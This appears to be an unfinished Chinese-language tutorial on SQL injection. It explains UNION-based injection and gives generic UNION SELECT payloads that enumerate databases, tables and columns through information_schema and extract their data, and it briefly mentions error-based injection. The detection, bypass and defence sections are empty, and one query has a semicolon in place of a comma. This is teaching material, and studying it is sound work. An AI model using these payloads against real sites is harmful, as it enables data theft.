# SQL 注入漏洞

## SQL注入概述

 服务端没有对用户提交的参数进行严格的过滤, 导致可以将SQL语句插入到可控参数中, 改变原有的SQL语义结构, 从而执行攻击者所预期的结果.

### 危害

* 获取数据库内容(拖库)
* 读取敏感系统文件
* 写入 Webshell
* 命令执行

## SQL注入利用

### 联合注入

`union` 用于合并两个SELECT 的结果集合.

* union 中必须由两条或两条以上的 select 语句组成, 语句之间使用 union 链接
* union 中的每个查询必须包含相同的列, 表达式或者聚合函数, 顺序可以不一致(查询字段相同, 表不一定相同)
* 列的数据类型必须兼容, 即必须是数据库可以隐含的转化他们的类型

所有数据库名: information_schema.SCHEMATA

```sql
SELECT
	1,
	GROUP_CONCAT( schema_name ),
	3 
FROM
	information_schema.SCHEMATA
```

所有表名: information_schema.TABLES

```sql
SELECT
	1,
	GROUP_CONCAT( table_name ),
	3 
FROM
	information_schema.TABLES 
WHERE
	table_schema = "数据库名"
```

查看某个表的列名

```sql
SELECT
	1,
	GROUP_CONCAT( column_name ),
	3 
FROM
	information_schema.COLUMNS 
WHERE
	table_name = "表名"
```

获取表中数据

```sql
SELECT
	1,
	GROUP_CONCAT( 列名 ),
	3 
FROM
	表名
ORDER BY
	2
```

查询数据库系统版本号和当前数据库名

```sql
SELECT
	1,
	2,
	VERSION();DATABASE()
```

### 报错注入

利用页面返回的 MySQL 报错信息, 将想得到数据库通过报错信息带出. 报错注入的利用方式和 MySQL 版本有很大的关联. 

## SQL注入探测



## SQL注入绕过



## SQL注入防御



## SQLMap使用